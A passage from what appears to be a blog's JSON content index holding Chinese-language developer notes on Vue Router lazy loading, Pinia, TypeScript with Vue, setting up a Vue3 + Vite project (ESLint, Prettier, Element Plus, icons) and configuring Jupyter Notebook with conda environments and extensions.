\u0026#39;emails\u0026#39;, component: UserEmailsSubscriptions }, { path: \u0026#39;profile\u0026#39;, components: { default: UserProfile, helper: UserProfilePreview } }] } 导航守卫 路由懒加载 当打包构建应用时，JavaScript 包会变得非常大，影响页面加载。如果我们能把不同路由对应的组件分割成不同的代码块，然后当路由被访问的时候才加载对应组件，这样就会更加高效。\nVue Router 支持开箱即用的动态导入，这意味着你可以用动态导入代替静态导入：\n1 2 3 4 5 6 7 8 9 // 将 // import UserDetails from \u0026#39;./views/UserDetails\u0026#39; // 替换成 const UserDetails = () =\u0026gt; import(\u0026#39;./views/UserDetails\u0026#39;) const router = createRouter({ // ... routes: [{ path: \u0026#39;/users/:id\u0026#39;, component: UserDetails }], }) component (和 components) 配置接收一个返回 Promise 组件的函数，Vue Router 只会在第一次进入页面时才会获取这个函数，然后使用缓存数据。这意味着你也可以使用更复杂的函数，只要它们返回一个 Promise ：\n1 2 3 4 const UserDetails = () =\u0026gt; Promise.resolve({ /* 组件定义 */ }) 一般来说，对所有的路由都使用动态导入是个好主意。\n状态管理 Pinia 参考链接：\nhttps://pinia.web3doc.top/getting-started.html\nPinia 快速入门\npinia 的使用（二）—— state\n安装 1 npm install pinia 创建一个 pinia（根存储）并将其传递给应用程序：\n1 2 3 4 5 6 7 8 9 10 import { createApp } from \u0026#39;vue\u0026#39; import App from \u0026#39;./App.vue\u0026#39; import { createPinia } from \u0026#39;pinia\u0026#39; const app = createApp(App) app.use(createPinia()) app.mount(\u0026#39;#app\u0026#39;) Store Store 是使用 defineStore() 定义的，并且它需要一个唯一名称，作为第一个参数传递：\n1 2 3 4 5 6 7 import { defineStore } from \u0026#39;pinia\u0026#39; // useStore 可以是 useUser、useCart 之类的任何东西 // 第一个参数是应用程序中 store 的唯一 id export const useStore = defineStore(\u0026#39;main\u0026#39;, { // other options... }) 这个 name，也称为 id，是必要的，Pinia 使用它来将 store 连接到 devtools。 将返回的函数命名为 use\u0026hellip; 是跨可组合项的约定，以使其符合你的使用习惯。\n1 2 3 4 5 6 7 8 9 \u0026lt;script setup lang=\u0026#34;ts\u0026#34;\u0026gt; import { useStore } from \u0026#39;@/store/demo\u0026#39; const store = useStore() console.log(\u0026#34;store.counter:\u0026#34;, store.counter); \u0026lt;/script\u0026gt; 请注意，store 是一个用reactive 包裹的对象，这意味着不需要在getter 之后写.value，但是，就像setup 中的props 一样，我们不能对其进行解构：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 export default defineComponent({ setup() { const store = useStore() // ❌ 这不起作用，因为它会破坏响应式 // 这和从 props 解构是一样的 const { name, doubleCount } = store name // \u0026#34;eduardo\u0026#34; doubleCount // 2 return { // 一直会是 \u0026#34;eduardo\u0026#34; name, // 一直会是 2 doubleCount, // 这将是响应式的 doubleValue: computed(() =\u0026gt; store.doubleCount), } }, }) 为了从 Store 中提取属性同时保持其响应式，您需要使用storeToRefs()。 它将为任何响应式属性创建 refs。 当您仅使用 store 中的状态但不调用任何操作时，这很有用：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import { storeToRefs } from \u0026#39;pinia\u0026#39; export default defineComponent({ setup() { const store = useStore() // `name` 和 `doubleCount` 是响应式引用 // 这也会为插件添加的属性创建引用 // 但跳过任何 action 或 非响应式（不是 ref/reactive）的属性 const { name, doubleCount } = storeToRefs(store) return { name, doubleCount } }, }) State 1 2 3 4 5 6 7 8 9 10 11 12 13 import { defineStore } from \u0026#39;pinia\u0026#39; const useStore = defineStore(\u0026#39;storeId\u0026#39;, { // 推荐使用 完整类型推断的箭头函数 state: () =\u0026gt; { return { // 所有这些属性都将自动推断其类型 counter: 0, name: \u0026#39;Eduardo\u0026#39;, isAdmin: true, } }, }) Getters Getter 完全等同于 Store 状态的 计算值。 它们可以用 defineStore() 中的 getters 属性定义。 他们接收“状态”作为第一个参数以鼓励箭头函数的使用：\n1 2 3 4 5 6 7 8 export const useStore = defineStore(\u0026#39;main\u0026#39;, { state: () =\u0026gt; ({ counter: 0, }), getters: { doubleCount: (state) =\u0026gt; state.counter * 2, }, }) 大多数时候，getter 只会依赖状态，但是，他们可能需要使用其他 getter。 正因为如此，我们可以在定义常规函数时通过 this 访问到 整个 store 的实例， 但是需要定义返回类型（在 TypeScript 中）。 这是由于 TypeScript 中的一个已知限制，并且不会影响使用箭头函数定义的 getter，也不会影响不使用 this 的 getter：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 export const useStore = defineStore(\u0026#39;main\u0026#39;, { state: () =\u0026gt; ({ counter: 0, }), getters: { // 自动将返回类型推断为数字 doubleCount(state) { return state.counter * 2 }, // 返回类型必须明确设置 doublePlusOne(): number { return this.counter * 2 + 1 }, }, }) 然后你可以直接在 store 实例上访问 getter：\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;template\u0026gt; \u0026lt;p\u0026gt;Double count is {{ store.doubleCount }}\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; export default { setup() { const store = useStore() return { store } }, } \u0026lt;/script\u0026gt; Actions Actions 相当于组件中的 methods。 它们可以使用 defineStore() 中的 actions 属性定义，并且它们非常适合定义业务逻辑：\n1 2 3 4 5 6 7 8 9 10 11 12 13 export const useStore = defineStore(\u0026#39;main\u0026#39;, { state: () =\u0026gt; ({ counter: 0, }), actions: { increment() { this.counter++ }, randomizeCounter() { this.counter = Math.round(100 * Math.random()) }, }, }) 与 getters 一样，操作可以通过 this 访问 whole store instance 并提供完整类型（和自动完成✨）支持。 与它们不同，actions 可以是异步的，您可以在其中await 任何 API 调用甚至其他操作！ 这是使用 Mande 的示例。 请注意，只要您获得“Promise”，您使用的库并不重要，您甚至可以使用浏览器的“fetch”函数：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import { mande } from \u0026#39;mande\u0026#39; const api = mande(\u0026#39;/api/users\u0026#39;) export const useUsers = defineStore(\u0026#39;users\u0026#39;, { state: () =\u0026gt; ({ userData: null, // ... }), actions: { async registerUser(login, password) { try { this.userData = await api.post({ login, password }) showTooltip(`Welcome back ${this.userData.name}!`) } catch (error) { showTooltip(error) // 让表单组件显示错误 return error } }, }, }) 你也可以完全自由地设置你想要的任何参数并返回任何东西。 调用 Action 时，一切都会自动推断！\nActions 像 methods 一样被调用：\n1 2 3 4 5 6 7 8 9 export default defineComponent({ setup() { const main = useMainStore() // Actions 像 methods 一样被调用： main.randomizeCounter() return {} }, }) Vuex TypeScript 与组合式 API 参考链接：\nhttps://cn.vuejs.org/guide/typescript/composition-api.html\n为组件的 props 标注类型 当使用 \u0026lt;script setup\u0026gt; 时，defineProps() 宏函数支持从它的参数中推导类型：\n1 2 3 4 5 6 7 8 9 \u0026lt;script setup lang=\u0026#34;ts\u0026#34;\u0026gt; const props = defineProps({ foo: { type: String, required: true }, bar: Number }) props.foo // string props.bar // number | undefined \u0026lt;/script\u0026gt; 这被称之为“运行时声明”，因为传递给 defineProps() 的参数会作为运行时的 props 选项使用。\n然而，通过泛型参数来定义 props 的类型通常更直接：\n1 2 3 4 5 6 \u0026lt;script setup lang=\u0026#34;ts\u0026#34;\u0026gt; const props = defineProps\u0026lt;{ foo: string bar?: number }\u0026gt;() \u0026lt;/script\u0026gt; 这被称之为“基于类型的声明”。编译器会尽可能地尝试根据类型参数推导出等价的运行时选项。在这种场景下，我们第二个例子中编译出的运行时选项和第一个是完全一致的。\n基于类型的声明或者运行时声明可以择一使用，但是不能同时使用。\n我们也可以将 props 的类型移入一个单独的接口中：\n1 2 3 4 5 6 7 8 \u0026lt;script setup lang=\u0026#34;ts\u0026#34;\u0026gt; interface Props { foo: string bar?: number } const props = defineProps\u0026lt;Props\u0026gt;() \u0026lt;/script\u0026gt; TypeScript 与选项式 API 参考链接：\nhttps://cn.vuejs.org/guide/typescript/options-api.html\n为组件的 props 标注类型 选项式 API 中对 props 的类型推导需要用 defineComponent() 来包装组件。有了它，Vue 才可以通过 props 以及一些额外的选项，比如 required: true 和 default 来推导出 props 的类型：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import { defineComponent } from \u0026#39;vue\u0026#39; export default defineComponent({ // 启用了类型推导 props: { name: String, id: [Number, String], msg: { type: String, required: true }, metadata: null }, mounted() { this.name // 类型：string | undefined this.id // 类型：number | string | undefined this.msg // 类型：string this.metadata // 类型：any } }) 然而，这种运行时 props 选项仅支持使用构造函数来作为一个 prop 的类型——没有办法指定多层级对象或函数签名之类的复杂类型。\n我们可以使用 PropType 这个工具类型来标记更复杂的 props 类型：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 import { defineComponent } from \u0026#39;vue\u0026#39; import type { PropType } from \u0026#39;vue\u0026#39; interface Book { title: string author: string year: number } export default defineComponent({ props: { book: { // 提供相对 `Object` 更确定的类型 type: Object as PropType\u0026lt;Book\u0026gt;, required: true }, // 也可以标记函数 callback: Function as PropType\u0026lt;(id: number) =\u0026gt; void\u0026gt; }, mounted() { this.book.title // string this.book.year // number // TS Error: argument of type \u0026#39;string\u0026#39; is not // assignable to parameter of type \u0026#39;number\u0026#39; this.callback?.(\u0026#39;123\u0026#39;) } }) ","permalink":"https://chance7bin.github.io/posts/note/vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","summary":"参考链接： 一个 Java 猿眼中 Vue3 和 Vue2 的差异 （建议收藏）Vue3 对比 Vue2.x 差异性、注意点、整体梳理，与React hook比又如何？（面试热点） Vue2升级","title":"Vue3学习笔记"},{"content":" **注意：**该笔记记录的是 Vue3 + TypeScript 的项目搭建流程\n参考链接：\nRuoYi(若依开源框架)-前后端分离版-前端流程简单分析\nhttps://github.com/lin-xin/vue-manage-system\nhttps://github.com/Armour/vue-typescript-admin-template\nvue-typescript-admin-template项目初始化\n1.npm install yarn -g\n2.yarn install\n3.npm run serve\n启动时可能会报错：Error: Cannot find module ‘node_modules\\fibers\\bin\\win32-x64-83\\fibers‘ 报错解决方案\n初始化项目 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 E:\\Projects\\OpenGMS-Lab\u0026gt;npm init vue@latest npm WARN config global `--global`, `--local` are deprecated. Use `--location=global` instead. Need to install the following packages: create-vue@latest Ok to proceed? (y) y Vue.js - The Progressive JavaScript Framework √ Project name: ... lab-ui √ Add TypeScript? ... No / Yes √ Add JSX Support? ... No / Yes √ Add Vue Router for Single Page Application development? ... No / Yes √ Add Pinia for state management? ... No / Yes √ Add Vitest for Unit Testing? ... No / Yes √ Add Cypress for both Unit and End-to-End testing? ... No / Yes √ Add ESLint for code quality? ... No / Yes √ Add Prettier for code formatting? ... No / Yes Scaffolding project in E:\\Projects\\OpenGMS-Lab\\lab-ui... Done. Now run: cd lab-ui npm install npm run dev 可能会遇到的问题：\n参考链接：\nTypeError: this.cliEngineCtor is not a constructor，webstorm和eslint的版本纠结\n项目配置 ESLint配置 参考链接：\nVue3+Vite+TS+Eslint（Airbnb规则）搭建生产项目，踩坑详记（一）\n1.安装依赖\n1 2 3 4 5 6 7 8 9 10 11 12 13 npm install eslint --save-dev npm install --save-dev @typescript-eslint/parser @typescript-eslint/eslint-plugin # ESLint官方提供的Vue插件，可以检查 .vue文件中的语法错误 npm install eslint-plugin-vue # 使用eslint插件将prettier作为eslint规则执行 npm install --save-dev eslint-plugin-prettier npm install --save-dev --save-exact prettier # 禁用所有与格式相关的eslint规则，也就是说把所有格式相关的校验都交给 prettier 处理 npm install --save-dev eslint-config-prettier 2.配置eslint\n.eslintrc.js\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 module.exports = { root: true, env: { node: true }, parserOptions: { ecmaVersion: 2020, parser: \u0026#34;babel-eslint\u0026#34; }, parser: \u0026#34;@typescript-eslint/parser\u0026#34;, extends: [ \u0026#34;plugin:vue/recommended\u0026#34;, \u0026#34;eslint:recommended\u0026#34;, \u0026#34;plugin:prettier/recommended\u0026#34; //把所有格式相关的校验都交给 prettier 处理 ], plugins: [\u0026#34;prettier\u0026#34;], rules: { \u0026#34;prettier/prettier\u0026#34;: \u0026#34;error\u0026#34; } }; 3.配置prettier\n有时会遇到 eslint 规则和 prettier 规则冲突的情况。eslint告诉我们要使用单引号，但是改为单引号以后，prettier有告诉我们要使用双引号。\n.prettierrc.js\n1 2 3 4 module.exports = { // 无尾逗号 \u0026#34;trailingComma\u0026#34;: \u0026#34;none\u0026#34; }; unplugin-vue-components 参考链接：\n尤大推荐的神器unplugin-vue-components,解放双手!以后再也不用呆呆的手动引入(组件,ui(Element-ui)库,vue hooks等)\n1.安装\n1 npm install unplugin-vue-components -D 2.配置 vite.config.ts\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import { fileURLToPath, URL } from \u0026#34;node:url\u0026#34;; import { defineConfig } from \u0026#34;vite\u0026#34;; import vue from \u0026#34;@vitejs/plugin-vue\u0026#34;; import vueJsx from \u0026#34;@vitejs/plugin-vue-jsx\u0026#34;; import Components from \u0026#34;unplugin-vue-components/vite\u0026#34;; import { ElementPlusResolver } from \u0026#34;unplugin-vue-components/resolvers\u0026#34;; // https://vitejs.dev/config/ export default defineConfig({ plugins: [ vue(), vueJsx(), Components({ resolvers: [ElementPlusResolver()] }) ], resolve: { alias: { \u0026#34;@\u0026#34;: fileURLToPath(new URL(\u0026#34;./src\u0026#34;, import.meta.url)) } } }); 3.插件会生成一个ui库组件以及指令路径components.d.ts文件\n4.将生成的文件加入到tsconfig.json中\nunplugin-auto-import 1.安装\n1 npm i -D unplugin-auto-import 2.配置 vite.config.ts\n1 2 3 4 5 6 7 8 9 10 11 12 13 // vite.config.js import { defineConfig } from \u0026#39;vite\u0026#39; import AutoImport from \u0026#39;unplugin-auto-import/vite\u0026#39; export default defineConfig({ plugins: [ AutoImport({ imports: [\u0026#39;vue\u0026#39;, \u0026#39;vue-router\u0026#39;, \u0026#39;vue-i18n\u0026#39;, \u0026#39;@vueuse/head\u0026#39;, \u0026#39;@vueuse/core\u0026#39;], // 可以选择auto-import.d.ts生成的位置，使用ts建议设置为\u0026#39;src/auto-import.d.ts\u0026#39; // dts: \u0026#39;src/auto-import.d.ts\u0026#39; }) ] }) 解决ESLint: 'defineStore' is not defined.(no-undef)\nunplugin-auto-import的配置和eslint报错解决\nvite-plugin-vue-setup-extend 参考链接：\nhttps://blog.csdn.net/ruisenLi/article/details/124385175\n1.安装\n1 npm i vite-plugin-vue-setup-extend -D 2.配置 vite.config.ts\n1 2 3 4 5 import { defineConfig } from \u0026#39;vite\u0026#39; import VueSetupExtend from \u0026#39;vite-plugin-vue-setup-extend\u0026#39; export default defineConfig({ plugins: [ VueSetupExtend() ] }) 3.使用\n1 2 3 \u0026lt;script lang=\u0026#34;ts\u0026#34; setup name=\u0026#34;demo\u0026#34;\u0026gt; \u0026lt;/script\u0026gt; 其他配置 ==导入类型检查的时候报错==\nTS1444: \u0026lsquo;RouteRecordRaw\u0026rsquo; is a type and must be imported using a type-only import when \u0026lsquo;preserveValueImports\u0026rsquo; and \u0026lsquo;isolatedModules\u0026rsquo; are both enabled.\n1 import { createRouter, createWebHashHistory, RouteRecordRaw } from \u0026#34;vue-router\u0026#34;; 修改为：\n1 2 import { createRouter, createWebHashHistory } from \u0026#34;vue-router\u0026#34;; import type { RouteRecordRaw } from \u0026#34;vue-router\u0026#34;; ==ESLint问题及解决方案： Parsing error: Unexpected token==\n参考链接：\nhttps://juejin.cn/post/7010688306383945742\n添加'parser': '@typescript-eslint/parser'，记得需要安装依赖npm install @typescript-eslint/parser --save-dev。\n修改后的.eslintrc.js\n1 2 3 4 5 // .eslintrc.js文件 \u0026#39;parser\u0026#39;: \u0026#39;@typescript-eslint/parser\u0026#39;, \u0026#39;parserOptions\u0026#39;: { \u0026#39;parser\u0026#39;: \u0026#39;babel-eslint\u0026#39;, }, ==引入自己的组件报错 Cannot find module \u0026lsquo;\u0026lsquo;xx\u0026rsquo;\u0026rsquo; or its corresponding type declarations.==\n参考链接：\nvue + ts中的shims-vue.d.ts文件的作用，在ts中引入vue-echarts等vue文件\n在env.d.ts中声明所有的.vue后缀文件\n1 2 3 4 5 declare module \u0026#39;*.vue\u0026#39; { import type { DefineComponent } from \u0026#39;vue\u0026#39; const component: DefineComponent\u0026lt;{}, {}, any\u0026gt; export default component } ==ESLint: this.libOptions.parse is not a function==\n参考链接：\nESLint: TypeError: this.libOptions.parse is not a function – Code Example\n1 npm install eslint@8.22.0 --save-exact ElementPlus 1.安装\n1 npm install element-plus --save 2.全局配置\n1 2 3 4 5 6 import ElementPlus from \u0026#39;element-plus\u0026#39; import zhCn from \u0026#39;element-plus/es/locale/lang/zh-cn\u0026#39; app.use(ElementPlus, { locale: zhCn, }) pinia 创建项目时自动安装\nrouter 创建项目时自动安装\n布局 App.vue\n1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;router-view /\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;style\u0026gt; @import \u0026#39;./assets/css/main.css\u0026#39;; @import \u0026#39;./assets/css/color-dark.css\u0026#39;; \u0026lt;/style\u0026gt; router/index.ts\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import { createRouter, createWebHistory } from \u0026#34;vue-router\u0026#34;; import HomeView from \u0026#34;../views/HomeView.vue\u0026#34;; const router = createRouter({ history: createWebHistory(import.meta.env.BASE_URL), routes: [ { path: \u0026#34;/\u0026#34;, name: \u0026#34;home\u0026#34;, component: HomeView }, { path: \u0026#34;/about\u0026#34;, name: \u0026#34;about\u0026#34;, // route level code-splitting // this generates a separate chunk (About.[hash].js) for this route // which is lazy-loaded when the route is visited. component: () =\u0026gt; import(\u0026#34;../views/AboutView.vue\u0026#34;) } ] }); export default router; 图标 element图标 1.安装element依赖\n1 npm install @element-plus/icons-vue 2.注册所有图标\n需要从 @element-plus/icons-vue 中导入所有图标并进行全局注册。\n1 2 3 4 5 6 7 8 9 // main.ts // 如果您正在使用CDN引入，请删除下面一行。 import * as ElementPlusIconsVue from \u0026#39;@element-plus/icons-vue\u0026#39; const app = createApp(App) for (const [key, component] of Object.entries(ElementPlusIconsVue)) { app.component(key, component) } 3.基础用法\n1 2 3 4 5 6 7 8 9 10 \u0026lt;!-- Use el-icon to provide attributes to SVG icon --\u0026gt; \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;el-icon :size=\u0026#34;size\u0026#34; :color=\u0026#34;color\u0026#34;\u0026gt; \u0026lt;Edit /\u0026gt; \u0026lt;/el-icon\u0026gt; \u0026lt;!-- Or use it independently without derive attributes from parent --\u0026gt; \u0026lt;Edit /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 自定义图标 参考链接：\nhttps://blog.csdn.net/weixin_42117267/article/details/112161481\n引入在线字体Iconfont（阿里图标库）：\nhttps://at.alicdn.com/t/font_830376_qzecyukz0s.css\nindex.html\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;icon\u0026#34; href=\u0026#34;/favicon.ico\u0026#34; /\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;Vite App\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://at.alicdn.com/t/font_830376_qzecyukz0s.css\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;module\u0026#34; src=\u0026#34;/src/main.ts\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; icon.css\n1 2 3 4 [class*=\u0026#34; el-icon-lx\u0026#34;], [class^=el-icon-lx] { font-family: lx-iconfont !important; } SVG图标 参考链接：\n通过vite-plugin-svg-icons 使用SVG图片\n","permalink":"https://chance7bin.github.io/posts/note/vue%E9%A1%B9%E7%9B%AE%E6%90%AD%E5%BB%BA/","summary":"**注意：**该笔记记录的是 Vue3 + TypeScript 的项目搭建流程 参考链接： RuoYi(若依开源框架)-前后端分离版-前端流程简单分析 https://github.com/lin-xin/vue-manage-system https://github.com/Armour/vue-typescript-admin-template vue-typesc","title":"Vue项目搭建"},{"content":"Jupyter初探 Jupyter Notebook介绍、安装及使用教程\nJupyter使用详解\nJupyter notebook安装 安装了Anaconda发行版时已经自动安装了Jupyter Notebook\n直接打开命令窗口，输入jupyter notebook启动jupyter notebook\n在浏览器输入url即可进入jupyter\n这些所列的文件目录都存放在直接打开cmd时的初始目录下\n设置Jupyter Notebook文件存放位置 创建配置文件\n1 jupyter notebook --generate-config 修改配置文件\n搜索c.NotebookApp.notebook_dir，设置文件的默认存储位置\n启动时出现的问题：\n[W 14:06:44.163 NotebookApp] 404 GET /api/kernels/39fc6aa7-5b95-4bc9-b561-b524370dbcd4/channels?session_id=0794ad0158734a7096f06b73e6d8cfd2 (127.0.0.1): Kernel does not exist: 39fc6aa7-5b95-4bc9-b561-b524370dbcd4\n解决方案：\n1 pip install --upgrade ipykernel 保存和检查点(checkpoint) 在开始前，要记得定时保存文件，这可以直接采用快捷键 Ctrl + S 保存文件，它是通过一个命令\u0026ndash;“保存和检查点”实现的，那么什么是检查点呢？\n每次创建一个新的 notebook，同时也创建了一个 checkpoint 文件，它保存在一个隐藏的子文件夹 .ipynb_checkpoints 中，并且也是一个 .ipynb 文件。默认 Jupyter 会每隔 120 秒自动保存 notebook 的内容到 checkpoint 文件中，而当你手动保存的时候，也会更新 notebook 和 checkpoint 文件。这个文件可以在因为意外原因关闭 notebook 后恢复你未保存的内容，可以在菜单中 File-\u0026gt;Revert to Checkpoint 中恢复。\n拓展功能 关联jupyter与conda环境 有两种方式关联\nnb_conda 关联Jupyter Notebook和conda的环境和包——“nb_conda”\nJupyter Notebook中切换conda虚拟环境\n① 安装\n1 conda install nb_conda ② 使用\n可以在Conda类目下对conda环境和包进行一系列操作。\n可以在笔记本内的“Kernel”类目里的“Change kernel”切换内核。\n③ 卸载\n1 conda remove nb_conda 执行上述命令即可卸载nb_conda包。\nJupyter notebook怎么使用自己新建的conda环境\n以下操作都在命令行中操作：\n1 conda create -n tensorflow_study python=3.6 tensorflow_study是我新建环境的名字，你的环境名字自己根据情况取；python版本也根据自己的需求来选择。\n1 conda activate tensorflow_study 进入新建的环境\n1 conda install nb_conda 安装nb_conda是为了实现不同环境的切换与选择。\n1 Jupyter notebook ==错误1：EnvironmentLocationNotFound: Not a conda environment==\n打开jupyter后点击Conda会弹出这样的错误：\n解决方法：\n找到Anaconda安装路径下nb_conda库的envmanager.py文件\nwin系统在目录：Anaconda3\\Lib\\site-packages\\nb_conda\\envmanager.py\nlinux系统在目录：Anaconda3/pkgs/nb_conda-2.2.1-py36_0/lib/python3.6/site-packages/nb_conda/envmanager.py\n找到该文件后在83~86行有这样一段代码：\n1 2 3 4 return { \u0026#34;environments\u0026#34;: [root_env] + [get_info(env) for env in info[\u0026#39;envs\u0026#39;]] } 我们将此段代码改成如下：\n1 2 3 return { \u0026#34;environments\u0026#34;: [root_env] + [get_info(env) for env in info[\u0026#39;envs\u0026#39;] if env != root_env[\u0026#39;dir\u0026#39;]] } 然后重启jupyter就可以了。\n==错误2：可使用的环境没有我新创建的jupyter环境==\n==nb_conda 要装到你的虚拟环境中才会在jupyter notebook中显示！！！！！！==\n如何在 Jupyter Notebook 中切换/使用 conda 虚拟环境\n使用 nb_conda_kernels 添加所有环境\n这个方法就是一键添加所有 conda 环境\n1 2 3 4 5 6 7 conda activate my-conda-env # this is the environment for your project and code conda install ipykernel conda deactivate conda activate base # could be also some other environment conda install nb_conda_kernels jupyter notebook 注意：这里的 conda install nb_conda_kernels 是在 base 环境下操作的。\n安装好后，打开 jupyter notebook 就会显示所有的 conda 环境啦，点击随意切换。\nipykernel 1、直接在新建一个环境的同时，给该环境安装ipykernel\n1 2 conda create -n 新环境名称 python=3.7 ipykernel # eg: conda create -n new python=3.7 ipykernel 2、激活虚拟环境\n1 2 source activate 环境名称 # eg: source activate new 3、将该环境写入jupyter的kernel中\n1 2 python -m ipykernel install --user --name 环境名称 --display-name \u0026#34;你想在jupyter中显示的该环境的名称\u0026#34; # eg: python -m ipykernel install --user --name new --display-name \u0026#34;jupyter环境\u0026#34; 4、进入jupyter 服务器\n1 jupyter notebook 安装插件 首先安装扩展库\n1 2 3 conda install -c conda-forge jupyter_contrib_nbextensions jupyter contrib nbextensions install --user conda install -c conda-forge jupyter_nbextensions_configurator -c conda-forge是指明在库conda-forge中下载jupyter_contrib_nbextensions\n1.Markdown生成目录\n不同于有道云笔记的Markdown编译器，Jupyter Notebook无法为Markdown文档通过特定语法添加目录，因此需要通过安装扩展来实现目录的添加。\n1 conda install -c conda-forge jupyter_contrib_nbextensions -c conda-forge是指明在库conda-forge中下载jupyter_contrib_nbextensions\n执行上述命令后，启动Jupyter Notebook，你会发现导航栏多了“Nbextensions”的类目，点击“Nbextensions”，勾选“Table of Contents ⑵”\n之后再在Jupyter Notebook中使用Markdown，点击下图的图标即可使用啦。\n==遇到的问题：==\n插件不显示\n解决方法：\njupyter nbextensions configurator不显示插件\n再执行如下命令\n1 2 conda install -c conda-forge jupyter_nbextensions_configurator jupyter contrib nbextensions install --user 2.代码自动补全扩展\n勾选 Hinterland\n安装插件后出现警告“Config option template_path not recognized by LenvsLatexExporter”\n原因是nbconvert6.0.0版本以上的某些参数的名称发生了更改，与原先版本不兼容，需要将版本降低到5.6.1\n1 pip install nbconvert==5.6.1 -i https://pypi.mirrors.ustc.edu.cn/simple jupyter代码自动补全插件、安装后出现警告“Config option template_path not recognized by LenvsLatexExporter”的解决方案\n3.主题\n4.Autopep8\n这是一个将代码按照PEP8进行格式化的插件，前提是需要通过pip install autopep8安装autopep8，安装完之后需要重启jupyter notebook服务才能生效。同样在Nbextention选项卡中勾选Autopep8，在工具栏中会多一个“锤子”一样的按钮，可以帮助我们排版代码，使其符合pep8标准。\n5.Variable inspector\n该插件可以帮助我们查看当前notebook中所有的变量的名称，类型，大小和值。省去了df.shape，type()等语句的执行，也代替了前文提到的魔法函数“%whos”的执行，读者可以自行尝试一下。\n6.Code folding\n顾名思义，该插件可以对代码进行一定的折叠，例如遇到class，def等关键字，而且主体代码又很长时，折叠代码会方便阅读，这一点也让jupyter notebook更像一个IDE。\n7.Execute time\n该插件可以显示每一个cell中代码的执行时间。\n除此之外还有一些其他常见的插件扩展，例如Notify，Collapsible headings等，读者可以自行探索查看，并配置使用。\nJupyter快捷键 加载指定网页源代码 1 %load URL 其中，URL为指定网站的地址。\n加载本地Python文件 1 %load Python文件的绝对路径 注意\nPython文件的后缀为“.py”。 “%load”后跟的是Python文件的绝对路径。 输入命令后，可以按CTRL 回车来执行命令。第一次执行，是将本地的Python文件内容加载到单元格内。此时，Jupyter Notebook会自动将“%load”命令注释掉（即在前边加井号“#”），以便在执行已加载的文件代码时不重复执行该命令；第二次执行，则是执行已加载文件的代码。 直接运行本地Python文件 执行命令：\n1 %run Python文件的绝对路径 或\n1 !python3 Python文件的绝对路径 或\n1 !python Python文件的绝对路径 注意\nPython文件的后缀为“.py”。 “%run”后跟的是Python文件的绝对路径。 “!python3”用于执行Python 3.x版本的代码。 “!python”用于执行Python 2.x版本的代码。 “!python3”和“!python”属于 !shell命令 语法的使用，即在Jupyter Notebook中执行shell命令的语法。 输入命令后，可以按 control return 来执行命令，执行过程中将不显示本地Python文件的内容，直接显示运行结果。 在Jupyter Notebook使用shell命令 ① 方法一——在笔记本的单元格中\n⑴ 语法\n1 !shell命令 在Jupyter Notebook中的笔记本单元格中用英文感叹号“!”后接shell命令即可执行shell命令。 1 !pip install jieba ② 方法二——在Jupyter Notebook中新建终端\n⑴ 启动方法\n在Jupyter Notebook主界面，即“File”界面中点击“New”；在“New”下拉框中点击“Terminal”即新建了终端。此时终端位置是在你的home目录，可以通过pwd命令查询当前所在位置的绝对路径。\n⑵ 关闭方法\n在Jupyter Notebook的“Running”界面中的“Terminals”类目中可以看到正在运行的终端，点击后边的“Shutdown”即可关闭终端。\nJupyterLab JupyterLab最全详解，如果你还在使用Notebook，那你就out了！\nJupyter Notebook是一个交互式笔记本，支持运行 40 多种编程语言。Jupyter Notebook 的本质是一个 Web 应用程序，便于创建和共享文学化程序文档，支持实时代码、数学方程、可视化和 markdown，用途包括：数据清理和转换，数值模拟，统计建模，机器学习等等 。\nJupyterLab是Jupyter主打的最新数据科学生产工具，在一定程度上是为了取代Jupyter Notebook。它支持安装插件以及有着更好的界面。而 JupyterHub是为多个用户提供Jupyter Notebook的最佳方式。\nJupyter NoteBook / JupyterLab / JupyterHub 区别与关系简介\n搭建环境方案（根据需求调整）：\n线上环境：The Littlest JupyterHub + JupyterLab 开发环境：JupyterHub + JupyterLab Tips\n当前版本的 Jupyter Lab 网页版可视化界面虽然用起来很方便，但是也存在很多问题，==目前最好的解决方法是尽量将对 Jupyter Lab 有改动的操作自己在 Anaconda Prompt 下进行==，最主要的原因就是==即使发生了问题，也可以从Prompt中直观的看到错误原因甚至解释==。这对于解决问题其实是至关重要的一环。\n安装 1 2 3 4 5 #创建环境 conda create --name env_name python=x.x -y conda activate env_name #安装jupyterlab conda install -c conda-forge jupyterlab 